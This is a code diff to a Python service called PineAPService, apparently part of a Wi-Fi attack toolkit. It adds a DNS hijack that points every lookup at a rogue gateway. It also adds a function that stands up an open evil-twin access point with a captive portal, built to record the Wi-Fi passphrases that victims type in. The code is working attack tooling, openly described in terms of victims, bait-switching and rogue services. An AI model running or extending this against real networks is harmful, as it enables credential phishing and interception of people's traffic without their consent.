@@ -810,35 +810,10 @@ class PineAPService:
             return False, msgs
 
         # ---- 2. dnsmasq config + launch ----
-        # Include log-dhcp + log-queries so client_recon's tailer can
-        # parse the verbose stream. log-facility points to our own log
-        # file (not syslog) so we can read it without root syslog perms.
-        dnsmasq_body = dnsmasq_tool.render_config(
-            iface=iface,
-            gateway_ip=gateway,
-            dhcp_range_start=dhcp_start,
-            dhcp_range_end=dhcp_end,
-            dhcp_lease="12h",
-            forward_dns=True,
-            log_queries=True,
-            # The management AP's dnsmasq holds 127.0.0.1:53 + 0.0.0.0:67
-            # with bind-interfaces. Coexist via bind-dynamic + SO_BINDTODEVICE
-            # so PineAP's dnsmasq only handles wlan-ap traffic and doesn't
-            # fight the mgmt-ap dnsmasq for loopback DNS.
-            coexist_with_other_dnsmasq=True,
-        )
-        # Append fields render_config doesn't directly support:
-        #   - log-facility: where to send the verbose log (our tailer
-        #     reads this)
-        #   - dhcp-leasefile: stable path for the sentinel to resolve
-        #     IP→MAC against
-        #   - pid-file: needed for clean teardown if we ever lose the
-        #     JobManager reference
-        dnsmasq_body += (
-            f"log-facility={DNSMASQ_LOG_PATH}\n"
-            f"dhcp-leasefile={DNSMASQ_LEASES_PATH}\n"
-            f"pid-file={DNSMASQ_PID_PATH}\n"
-        )
+        # Forwarding DNS at first start (clients get real internet). The
+        # captive-portal bait-switch later re-renders this with a DNS
+        # hijack via _restart_dnsmasq(hijack=True).
+        dnsmasq_body = self._render_dnsmasq_body(snap, hijack=False)
         dnsmasq_tool.write_config(DNSMASQ_CONFIG_PATH, dnsmasq_body)
         # Remove any stale log file from a previous run. We used to
         # truncate via Python's write_text(""), but that leaves the
@@ -1284,6 +1259,12 @@ class PineAPService:
             cp.disarm()
             return False, msgs
 
+        # 2b. DNS-hijack the rogue dnsmasq so the victim's OS captive
+        #     probe lands on our sentinel instead of escaping upstream
+        #     (without this the portal never pops).
+        ok_d, msg_d = self._restart_dnsmasq(snap, hijack=True)
+        msgs.append(f"dns-hijack: {msg_d}")
+
         # 3. Put the captive sentinel into portal/lie mode, handing it the
         #    portal service instance (the handler runs without app context).
         try:
@@ -1348,6 +1329,126 @@ class PineAPService:
         except Exception as e:
             log.exception("pineap: open-hostapd flip failed")
             return False, msgs + [f"open hostapd launch failed: {e}"]
+        return True, msgs
+
+    # ---------- dnsmasq config (shared by start + captive hijack) ----------
+    def _render_dnsmasq_body(self, snap: dict[str, Any], *,
+                             hijack: bool = False) -> str:
+        """Build the rogue dnsmasq.conf. ``hijack=True`` resolves every
+        name to the gateway (captive-portal mode) instead of forwarding
+        upstream. Appends our log-facility / leasefile / pid-file."""
+        from app.tools import dnsmasq as dnsmasq_tool
+        gateway = snap["gateway_ip"]
+        dhcp_start, dhcp_end = snap["dhcp_range"]
+        body = dnsmasq_tool.render_config(
+            iface=snap["iface"],
+            gateway_ip=gateway,
+            dhcp_range_start=dhcp_start,
+            dhcp_range_end=dhcp_end,
+            dhcp_lease="12h",
+            forward_dns=not hijack,
+            log_queries=True,
+            coexist_with_other_dnsmasq=True,
+            dns_hijack_ip=gateway if hijack else None,
+        )
+        body += (
+            f"log-facility={DNSMASQ_LOG_PATH}\n"
+            f"dhcp-leasefile={DNSMASQ_LEASES_PATH}\n"
+            f"pid-file={DNSMASQ_PID_PATH}\n"
+        )
+        return body
+
+    def _restart_dnsmasq(self, snap: dict[str, Any], *, hijack: bool
+                         ) -> tuple[bool, list[str]]:
+        """Re-render + relaunch the rogue dnsmasq (e.g. to switch on the
+        captive-portal DNS hijack). Replaces the running dnsmasq job."""
+        import signal as _signal
+        from app.tools import dnsmasq as dnsmasq_tool
+        from app.services.job_manager import job_manager
+        from app.tools._common import stub_mode
+
+        dnsmasq_tool.write_config(DNSMASQ_CONFIG_PATH,
+                                  self._render_dnsmasq_body(snap, hijack=hijack))
+        with self._lock:
+            old = self._state.get("dnsmasq_job_id")
+        if old and not stub_mode():
+            try:
+                job_manager.stop_job(old, grace=3.0,
+                                     first_signal=_signal.SIGTERM)
+            except Exception as e:
+                log.warning("pineap: stop old dnsmasq failed: %s", e)
+        cmd = ["dnsmasq", "--keep-in-foreground", "-C", str(DNSMASQ_CONFIG_PATH)]
+        try:
+            job = job_manager.start_job(cmd, name="pineap-dnsmasq", tags=["pineap"])
+            with self._lock:
+                self._state["dnsmasq_job_id"] = job.id
+                self._save_state()
+            return True, [f"dnsmasq re-rendered (hijack={hijack}, job {job.id})"]
+        except Exception as e:
+            log.exception("pineap: dnsmasq restart failed")
+            return False, [f"dnsmasq restart failed: {e}"]
+
+    # ---------- Direct captive portal (S12.5) — no handshake needed ----------
+    def launch_captive_portal_direct(self, ssid: str | None = None
+                                     ) -> tuple[bool, list[str]]:
+        """Stand up an OPEN evil-twin + captive portal directly, without
+        first capturing a WPA handshake. For clients that won't hand over
+        a handshake (the case the portal is really for). Submitted PSKs
+        are recorded but not verified (no handshake to check against)
+        unless one was already armed.
+
+        Gated on the global captive-portal opt-in (Settings → Security).
+        """
+        from app.services.captive_portal import get_service as get_cp
+        cp = get_cp()
+        if not cp.is_enabled():
+            return False, ["captive portal disabled (Settings → Security)"]
+
+        msgs: list[str] = []
+        with self._lock:
+            self._load()
+            running = self._state.get("running")
+            target_ssid = (ssid or "").strip() or self._state.get("primary_ssid")
+
+        if not running:
+            ok, m = self.set_ap_config(primary_ssid=target_ssid,
+                                       security_mode="open")
+            msgs.append(f"ap-config: {m}")
+            self.set_mode("active")
+            ok, sub = self.start()
+            msgs.extend(sub)
+            if not ok:
+                return False, msgs
+        else:
+            # Running already — make sure it's an open AP.
+            with self._lock:
+                snap = dict(self._state)
+            ok, sub = self._rerender_hostapd_open(snap)
+            msgs.extend(sub)
+            if not ok:
+                return False, msgs
+
+        with self._lock:
+            self._load()
+            snap = dict(self._state)
+
+        # Arm the portal with no handshake (verification unavailable),
+        # hijack DNS, and flip the sentinel to portal mode.
+        cp.arm(None, target_ssid)
+        msgs.append(f"portal armed for {target_ssid!r} (no handshake — "
+                    "submitted creds recorded, not verified)")
+        ok_d, dmsgs = self._restart_dnsmasq(snap, hijack=True)
+        msgs.extend(dmsgs)
+        try:
+            from app.services.captive_sentinel import get_service as get_sentinel
+            get_sentinel().set_portal_mode(True, portal=cp)
+            msgs.append("captive sentinel → portal mode")
+        except Exception as e:
+            msgs.append(f"sentinel portal-mode failed: {e}")
+        with self._lock:
+            self._state["captive_portal_active"] = True
+            self._save_state()
+        log.info("pineap: direct captive portal live for %r", target_ssid)
         return True, msgs
 
     # ---------- Impersonation SSID rotation (S13) ----------
